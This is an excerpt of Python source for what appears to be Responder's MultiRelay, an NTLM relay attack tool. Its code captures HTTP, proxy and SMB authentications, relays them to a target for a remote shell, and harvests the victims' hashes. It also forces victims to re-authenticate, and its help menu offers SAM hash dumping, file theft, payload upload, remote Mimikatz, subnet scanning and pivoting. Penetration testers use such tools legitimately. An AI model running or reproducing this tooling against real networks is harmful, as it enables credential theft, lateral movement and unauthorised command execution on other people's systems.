...
parser = optparse.OptionParser(
    usage="\npython %prog -t 10.20.30.40 -u Administrator lgandx admin\npython %prog -t 10.20.30.40 -u ALL",
    version=__version__,
    prog=sys.argv[0])
parser.add_option(
    '-t',
    action="store",
    help="Target server for SMB relay.",
    metavar="10.20.30.45",
    dest="TARGET")
parser.add_option(
    '-p',
    action="store",
    help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",
    metavar="8081",
    dest="ExtraPort")
parser.add_option(
    '-u',
    '--UserToRelay',
    help="Users to relay. Use '-u ALL' to relay all users.",
    action="callback",
...
parser.add_option(
    ...
    '--command',
    action="store",
    help="Single command to run (scripting)",
    metavar="whoami",
    dest="OneCommand")
parser.add_option(
    '-d',
...
def ShowWelcome():
    print color(
        '\nResponder MultiRelay %s NTLMv1/2 Relay' %
        (__version__), 8, 1)
...
def ShowHelp():
    ...
    print color('dump', 8, 1) + \
        '               -> Extract the SAM database and print hashes.'
    print color('regdump KEY', 8, 1) + \
        '        -> Dump an HKLM registry key (eg: regdump SYSTEM)'
    print color('read Path_To_File', 8, 1) + \
        '  -> Read a file (eg: read /windows/win.ini)'
    print color(
        'get  Path_To_File',
        8,
        1) + '  -> Download a file (eg: get users/administrator/desktop/password.txt)'
    print color('delete Path_To_File', 8, 1) + \
        '-> Delete a file (eg: delete /windows/temp/executable.exe)'
    print color(
        'upload Path_To_File',
        8,
        1) + '-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\'
    print color(
        'runas  Command',
        8,
        1) + '     -> Run a command as the currently logged in user. (eg: runas whoami)'
    print color(
        'scan /24',
        8,
        1) + '           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to'
    print color('pivot  IP address', 8, 1) + \
        '  -> Connect to another host (eg: pivot 10.0.0.12)'
    print color('mimi  command', 8, 1) + \
        '      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)'
    print color('mimi32  command', 8, 1) + \
        '    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)'
    print color(
        'lcmd  command',
        8,
        1) + '      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)'
    print color('help', 8, 1) + '               -> Print this message.'
    print color('exit', 8, 1) + \
...
# Function used to make sure no connections are accepted on HTTP and
# HTTP_Proxy while we are pivoting.
...
class HTTPProxyRelay(BaseRequestHandler):
    ...
    def handle(self):
        ...
        try:
            # Don't handle requests while a shell is open. That's the goal
            # after all.
            if IsShellOpen():
                return None
            if IsPivotOn():
        ...
        try:
            ...
            if Webdav:
                # If it is, send the option answer, we'll send him to auth when
                # we receive a profind.
            ...
            if NTLM_Auth:
                ...
                if Packet_NTLM == "\x01":
                    # SMB Block. Once we get an incoming NTLM request, we grab
                    # the ntlm challenge from the target.
                    ...
                    if smbdata[8:10] == "\x72\x00":
                        head = SMBHeader(
                            ...
                            flag2="\x43\xc8",
                            mid="\x02\x00")
                        t = SMBSessionSetupAndxNEGO(
                            Data=b64decode(''.join(NTLM_Auth)))
                        t.calculate()
                    ...
                    # Retrieve challenge message from smb
                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))
                    # Grab challenge key for later use (hash parsing).
                    key = ExtractHTTPChallenge(smbdata, Pivoting)
                    # We send NTLM message 2 to the client.
                    self.request.send(str(Buffer_Ans))
                    data = self.request.recv(8092)
                    NTLM_Proxy_Auth = re.findall(
                        r'(?<=Authorization: NTLM )[^\r]*', data)
                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

                    # Got NTLM Message 3 from client.
                    if Packet_NTLM == "\x03":
                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                        # Might be anonymous, verify it and if so, send no go
                        # to client.
                        if IsSMBAnonymous(NTLM_Auth):
                            ...
                            # and has not attempted before. While at it, let's
                            # grab his hash.
                            Username, Domain = ParseHTTPHash(
                                NTLM_Auth, key, self.client_address[0], UserToRelay, Host[0], Pivoting)
                            ...
                            if Username is not None:
                                head = SMBHeader(cmd="\x73",
                                                 ...
                                                 mid="\x03\x00")
                                # Final relay.
                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)
                                t.calculate()
                                packet1 = str(head) + str(t)
                                buffer1 = longueur(packet1) + packet1
                                ...
                                smbdata = s.recv(2048)
                                RunCmd = RunShellCmd(
                                    smbdata, s, self.client_address[0], Host, Username, Domain)
                                if RunCmd is None:
                                    s.close()
                                    self.request.close()
                                    return None
            ...
            self.request.close()
            # No need to print anything (timeouts, rst, etc) to the user
            # console..
            pass
    ...
    def handle(self):
        ...
        try:
            ...
            if data.find("NTLM") is not -1:
                # Start with nego protocol + session setup negotiate to our
                # target.
            ...
            if data.find("NTLM") is not -1:
                ...
                if data[8:10] == "\x73\x00":
                    ...
                    # Then simply grab the whole session setup packet except
                    # the smb header from the client and pass it to the server.
                    t = smbdata[36:]
            ...
            if IsSMBAnonymous(data):
                ...
                # Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                # and has not attempted before. While at it, let's grab his
                # hash.
                Username, Domain = ParseSMBHash(
                    data, self.client_address[0], challenge, UserToRelay, Host[0], Pivoting)
                if Username is not None:
                    ...
                    # Let's kill that connection so we can force him to reauth
                    ...
                    # Send logon failure, so our client might authenticate with
                    # another account.
                    head = SMBHeader(
                        cmd="\x73",
                        flag1="\x98",
...
def RunShellCmd(data, s, clientIP, Target, Username, Domain):
    ...
    # Pivoting gets used when the pivot cmd is used, it let us figure out in
    # which mode is MultiRelay. Initial Relay or Pivot mode.
    global Pivoting
    ...
    # On this block we do some verifications before dropping the user into the
    # shell.
    ...
    # Tree Connect
    if data[8:10] == "\x73\x00":
        # While at it, verify if the target has returned a guest session.
        GetSessionResponseFlags(data)
    ...
    # This one should not happen since we always use the IP address of the
    # target in our tree connects, but just in case..
    ...
    # Run one command.
    if data[8:10] == "\x75\x00" and OneCommand is not None or Dump:
        print "[+] Authenticated."
        if OneCommand is not None:
    ...
    # Drop into the shell.
    if data[8:10] == "\x75\x00" and OneCommand is None:
        if Pivoting[0] == "1":
            pass
        else:
    ...
    while True:
        ...
        # We either just arrived here or we're back from a command operation,
        # let's setup some stuff.
        if data[8:10] == "\x75\x00":
            # start a thread for raw_input, so we can do other stuff while we
            # wait for a command.
            ...
            if Upload:
                ...
                if os.path.isfile(File):
                    ...
                    data = WriteFile(
                        data, s, File, FileSize, FileContent, Target[0])
                    del Cmd[:]
                else:
            ...
            if RunAs:
                if os.path.isfile(RunAsFileName):
                    ...
                    data = WriteFile(
                        data, s, FileName, FileSize, FileContent, Target[0])
                    Exec = RunAs[0]
                    data = RunAsCmd(
                        data,
                        s,
            ...
            if Pivot:
                if Pivot[0] == Target[0]:
                    ...
                    if ShowSigning(Pivot[0]):
                        ...
                        if os.path.isfile(RunAsFileName):
                            FileSize, FileContent = UploadContent(
                                RunAsFileName)
                            FileName = os.path.basename(RunAsFileName)
                            data = WriteFile(
                                data, s, FileName, FileSize, FileContent, Target[0])
                            RunAsPath = '%windir%\\Temp\\' + FileName
                            Status, data = VerifyPivot(
                                data, s, clientIP, Username, Domain, Pivot[0], Logs, Target[0], RunAsPath, FileName)
                            ...
                            if Status:
                                ...
                                if os.path.isfile(RunAsFileName):
                                    ...
                                    Pivoting = ["1"]
                                    data = PivotToOtherHost(
                                        data, s, clientIP, Username, Domain, Logs, Target[0], RunAsPath, FileName)
                                    del Cmd[:]
                                    s.close()
                                    return None

                            if not Status:
                                print "[Pivot Verification Failed]: This user doesn't have enough privileges on " + \
                                    Pivot[0] + " to pivot. Try another host."
                                del Cmd[:]
                                del Pivot[:]
                        else:
                            print RunAsFileName + " does not exist, please specify a valid file."
        ...
        # We confirmed with OpenAndX that no file remains after the execution
        # of the last command. We send a tree connect IPC and land at the
        # begining of the command loop.
...
def serve_thread_tcp(host, port, handler):
    try:
        ...
        print color(
            'Error starting TCP server on port ' +
            str(port) +
